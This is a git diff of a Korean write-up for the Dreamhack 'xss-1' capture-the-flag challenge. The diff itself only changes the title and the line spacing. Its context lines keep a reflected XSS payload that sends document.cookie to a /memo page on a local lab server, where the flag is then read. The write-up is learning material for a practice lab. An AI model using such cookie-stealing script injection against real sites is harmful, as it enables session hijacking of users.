@@ -1,4 +1,4 @@
-# xss-1
+# xss-1 (28)
 
 ## 문제
 
@@ -21,10 +21,10 @@ FLAG 변수를 따라가 보면 /flag path의 POST method에서 값을 얻을 �
 http://127.0.0.1:8000/vuln?param=<script>location.href="/memo?memo="+document.cookie</script>
 ```
 
-- 실행 화면
+- 실행 화면  
 ![image](https://github.com/GwangIl-Park/dreamhack-playground/assets/40749130/552786c0-816c-44e6-8ea0-7508daf2423f)
 
-- /memo path에서 DH 확인 가능
+- /memo path에서 DH 확인 가능  
 ![image](https://github.com/GwangIl-Park/dreamhack-playground/assets/40749130/44778022-f630-4d6c-a4c4-de7848d4ce4b)
 
 방법 2.
